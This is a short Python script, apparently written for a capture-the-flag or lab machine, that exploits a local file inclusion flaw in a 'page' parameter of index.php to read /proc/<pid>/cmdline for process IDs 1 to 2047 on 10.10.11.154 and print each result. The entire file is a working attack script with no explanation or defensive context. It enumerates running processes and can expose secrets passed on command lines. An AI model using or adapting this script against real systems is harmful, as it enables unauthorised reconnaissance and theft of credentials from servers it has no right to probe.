#!/usr/bin/python3


import requests



def perform_request():

    pids = range(1, 2048)

    for pid in pids:
        print("[*] in the pid ", pid)
        base_url = f"http://10.10.11.154/index.php?page=/proc/{pid}/cmdline"
        headers = {
            'User-Agent':'curl/8.12.1',
            'Accept': '*/*'
        }
        req = requests.get(url=base_url, headers=headers, allow_redirects=False)
        print(req.text)



if __name__ == "__main__":
    perform_request()
